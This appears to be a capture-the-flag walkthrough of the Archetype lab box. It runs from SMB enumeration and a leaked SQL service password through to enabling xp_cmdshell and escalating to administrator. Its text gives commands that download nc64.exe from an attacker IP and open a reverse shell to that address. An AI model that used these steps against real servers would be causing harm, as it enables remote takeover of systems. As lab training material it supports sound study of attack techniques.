![](https://cdn-images-1.medium.com/max/1000/1*9OX4j6HQu9v0BpslIMBGmA.png)

   

![](https://cdn-images-1.medium.com/max/1000/0*pvXctdtX1d77RECN.png)

- -sV: service detection
- 1433: SQL Server
- 445: Microsoft-DS (SMB)

![](https://cdn-images-1.medium.com/max/1000/0*uKYHCmMiMcCX_h8q.png)

- -N: no pass
- -L: host
- Sharename ends with $: Administrative share

   

![](https://cdn-images-1.medium.com/max/1000/0*ROTXhiDOQJCYfoU0.png)

◄ 28s ◎ cat prod.dtsConfig                                                                                   ⌂via 🐘  0% ░ 00:06  
<DTSConfiguration>  
    <DTSConfigurationHeading>  
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>  
    </DTSConfigurationHeading>  
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">  
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>  
    </Configuration>  
</DTSConfiguration>%

Searching [Impacket cheatsheet](https://rgbwiki.com/Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/):

   

![](https://cdn-images-1.medium.com/max/1000/0*f9HIoUf0_urDn6PE.png)

   

![](https://cdn-images-1.medium.com/max/1000/0*ahVt2w7IzSsYxdfH.png)

Login using username and password found above.

   

![](https://cdn-images-1.medium.com/max/1000/0*lhj-N8YNLMgEv77H.png)

Searching and found WinPEAS.

   

![](https://cdn-images-1.medium.com/max/1000/0*eVbfOA1Il866t8IR.png)

First, we need to get a shell

   

![](https://cdn-images-1.medium.com/max/1000/0*Zn3R-hmCQSDzoaSp.png)

The command is disabled but can be enabled with admin.

Enable:

EXEC sp_configure 'show advanced options', 1; // Enable advanced options  
RECONFIGURE; // Apply changes  
EXEC sp_configure 'xp_cmdshell', 1; // Enable xp_cmdshell to run commands   
RECONFIGURE; // Apply changes

Its working now:

   

![](https://cdn-images-1.medium.com/max/1000/0*ilchmIMSIVq-VwfY.png)

Next, we will gain a reverse shell, use [netcat](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) on the target and control it through a listening port.

   

![](https://cdn-images-1.medium.com/max/1000/0*40-czwnL8cyb7qsV.png)

We will download the file to target machine

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.163/nc64.exe -outfile nc64.exe"

Setup a listener and execute it:

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.163 8888"

   

![](https://cdn-images-1.medium.com/max/1000/0*5ZShOawE6R6uhYzT.png)

Navigate around and found the first flag:

![](https://cdn-images-1.medium.com/max/1000/0*K5wz8rcgt7VsCkXk.png)

Now we need to execute [WinPEAS](https://github.com/peass-ng/PEASS-ng/releases) on target to escalate privilege

   

![](https://cdn-images-1.medium.com/max/1000/0*zpWgGat4Y_KLXMZg.png)

Found Powershell history:

   

![](https://cdn-images-1.medium.com/max/1000/0*rJizDQIROP_7iYQa.png)

   

![](https://cdn-images-1.medium.com/max/1000/0*mOYENProas5Z2zF4.png)

Connect to admin using found password:

   

![](https://cdn-images-1.medium.com/max/1000/0*1U1_kI2TwK3la6mH.png)

Final flag:

   

![](https://cdn-images-1.medium.com/max/1000/0*xNHaTtsb3uuLwrk-.png)
